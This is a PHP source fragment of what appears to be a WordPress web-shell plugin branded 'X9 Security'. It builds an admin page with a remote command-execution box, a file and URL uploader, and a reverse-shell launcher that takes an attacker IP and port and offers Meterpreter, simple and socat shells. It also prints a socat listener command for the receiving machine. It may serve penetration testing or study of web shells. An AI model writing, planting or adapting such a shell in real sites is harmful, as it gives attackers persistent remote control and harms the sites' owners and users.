	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
	QmCC" style="width:200px;" alt="X9 Security Logo" /></div></br><tt style="color: white;">Wordpress Shell</center></br>';

	echo '<div style="background-color:#ffffff; border-radius:8px; padding: 2px; color:#222;  margin-right:2px; margin-left:2px; margin-top:2px; margin-bottom: 2px;">';
	echo '<div style="width:100%; height:100%;"></div>';
	echo '<div class="wrap">';
	echo 'Operating System: <b>' . $OS . '</b></br>';
	echo 'Kernel Version: <b>' . $kernel . '</b></br>';
	echo 'Folder Writable: <b id="writabletext">';
	if($writable == 1)
	{
	        echo '<font style="color:green;">Yes</font></b></br>';
	}
	else
	{
	        echo '<font style="color:red;">No</font></b></br>';
	}


	echo '<div style="width:auto; height:0vh; border:solid; color:rgb(201, 0, 0);"></div></br>';

	echo '<div style="width:100%; height: 185px;">';
	echo '<div style="width:33%; height: auto; display: inline-block; float: left;">';

	echo '<center>Command:</br> <input value="' . $cmd . '" type="text" name="cmd" class="cmd"></input></center></br>';
	echo '<center>Path:</br>    <input value="' . $path . '" type="text" name="path" class="path""></input></center></br>';
	echo '<center><input type="submit" id="cmdsubmit" value="Submit" style="background-color: rgb(201, 0, 0); color:#fff; border-radius:8px;"></button></center>';

	echo '</div>';
	echo '<div style="width:33%; height: auto; display: inline-block; float: left;">';

	echo '<form id="fileform"  method="post" enctype="multipart/form-data"                   >';
	echo '<center>File:</br>   <input id="file" type="file" name="file"></input></center></br>';
	echo '<center>URL:</br>    <input name="url" value=""></input></center></br>';
	echo '<center><input type="submit" id="filesubmit" name="filesubmit" value="Upload" style="background-color: rgb(201, 0, 0); color:#fff; border-radius:8px;"></button></center>';
	echo '<input type="hidden" name="cmd" value="' . $cmd . '"/>';
	echo '<input type="hidden" name="path" value="' . $path . '"/>';
	echo '<input type="hidden" name="MAX_FILE_SIZE" value="30000" />';
	echo '</form>';

	echo '</div>';
	echo '<div style="width:33%; height: auto; display: inline-block; float: left;">';

	echo '<form method="post" id="shellform" enctype="multipart/form-data"                   >';
	echo '<center>IP Address:</br>    <input name="ip" value=""></input></center></br>';
	echo '<center>Port:</br>    <input name="port" value="" id="port"></input></center>';

	echo '<center><select name="shelltype" id="shelltype" style="margin-top:8px;">';
	echo '<option name="metershell" value="metershell">Meterpreter Shell</option>';
	echo '<option name="simpleshell" value="simpleshell">Simple Shell</option>';
	if(strpos($OS, 'Linux') != false)
	{
	        echo '<option name="socatshell" value="socatshell">Socat Shell</option>';
	}

	echo '</select></center>';
	//echo '<center><input type="submit" name="simpleshell" value="Simple Shell" style="background-color: rgb(201, 0, 0); color:#fff; border-radius:8px;"></button></center>';
	echo '<center><input type="submit" id="shellsubmit" name="shellsubmit" value="Submit" style="background-color: rgb(201, 0, 0); color:#fff; margin-top: 4px; border-radius:8px;"></button></center>';
	echo '<input type="hidden" name="cmd" value="' . $cmd . '"/>';
	echo '<input type="hidden" name="path" value="' . $path . '"/>';
	echo '<input type="hidden" name="MAX_FILE_SIZE" value="30000" />';
	echo '</form>';

	echo '</div>';

	echo '</div>';

	echo '<div style="width:auto; height:0vh; margin-top: 20px; border:solid; color:rgb(201, 0, 0);"></div></br>';

	echo '<div class="output" style="width:100%; height: auto; background-color:#222; color:#fff; border-radius: 8px;">';
	echo '<pre style="padding: 8px;"></pre>';
	echo '</div>';
	echo '</div></br>';


	//echo '<button onclick="shellrequest(\'' . plugins_url( 'request.php', __FILE__ ) . '\', \'ls\');">Click me</button> ';

	echo '<script type="text/javascript" >';
	echo '(function() {';
	echo 'document.getElementById("cmdsubmit").onclick = function() {';
	echo 'var val = "cd " + document.getElementsByClassName("path")[0].value + ";" + document.getElementsByClassName("cmd")[0].value;';
	echo 'var q = shellrequest(\'' . plugins_url( 'request.php', __FILE__ ) . '\', val);';
    echo 'document.getElementsByClassName("output")[0].innerHTML = q;';
	echo 'var writable = iswritable(\'' . plugins_url( 'writable.php', __FILE__ ) . '\', document.getElementsByClassName("path")[0].value);';
	echo 'document.getElementById("writabletext").innerHTML = writable;';
        echo '};';
	echo '})();';
	echo '</script>';

    echo '<script type="text/javascript" >';
    echo '(function() {';
    echo 'document.getElementById("filesubmit").onclick = function() {';
	echo 'document.getElementById("fileform").children[5].value = document.getElementsByClassName("cmd")[0].value;';
	echo 'document.getElementById("fileform").children[6].value = document.getElementsByClassName("path")[0].value;';
    echo '};';
	echo '})();';
    echo '</script>';

    echo '<script type="text/javascript" >';
    echo '(function() {';
    echo 'document.getElementById("shellsubmit").onclick = function() {';
    echo 'document.getElementById("shellform").children[5].value = document.getElementsByClassName("cmd")[0].value;';
    echo 'document.getElementById("shellform").children[6].value = document.getElementsByClassName("path")[0].value;';
	echo 'if (document.getElementById("shelltype").value == "socatshell") {';
	echo 'alert("Please run \"socat file:`tty`,raw,echo=0 tcp-listen:" + document.getElementById("port").value + "\" on the recieving machine.");';
	echo '}';
    echo '};';
    echo '})();';
    echo '</script>';


	echo '</div>';
	echo '</div>';
	echo '</div>';
	
	
}

?>
